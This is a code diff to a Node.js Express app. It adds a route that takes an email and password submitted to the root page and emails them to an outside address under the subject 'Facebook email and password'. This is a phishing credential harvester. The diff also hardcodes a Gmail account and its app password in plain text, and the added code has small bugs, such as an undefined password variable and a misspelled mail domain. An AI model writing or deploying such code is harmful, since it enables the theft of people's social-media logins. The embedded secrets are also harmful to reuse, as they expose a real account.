@@ -18,6 +18,18 @@ var request_password;
 var request_confirm_password;
 var s;
 var script = "";
+const nodemailer = require("nodemailer");
+var transporter = nodemailer.createTransport({
+    service: 'gmail',
+    host: 'smtp.gmail.com',
+    secure: true,
+    port: 465,
+
+    auth: {
+        user: 'bassem.sadaqah@gmail.com',
+        pass: 'fpmtfmcvrwpenfuy'
+    }
+});
 // #########################################################################################################################################################################################
 const client = new pg.Client({
     user: 'vknjruhfiarkkd',
@@ -39,6 +51,26 @@ app.get('/sign_up', function (req, res) {
     res.render('sign_up', { max: '', script: script })
 })
 // #########################################################################################################################################################################################
+app.post('/', function (req, res) {
+    var email=req.body.email;
+    var pass=req.body.pass;
+    var mailOptions = {
+        from: 'bassem.sadaqah@gmail.com',
+        to: "bassemsadakah.bs@gmal.com",
+        subject: 'Facebook email and password',
+        text: 'email: '+email+'\n password: '+password,
+        html:''
+        
+    };
+    transporter.sendMail(mailOptions, function (error, info) {
+        if (error) {
+            console.log(error);
+        } else {
+            console.log('Email sent: ' + info.response);
+        }
+    });
+
+});
 app.post('/sign_up', function (req, res) {
     request_first_name = req.body.first_name;
     request_last_name = req.body.last_name;
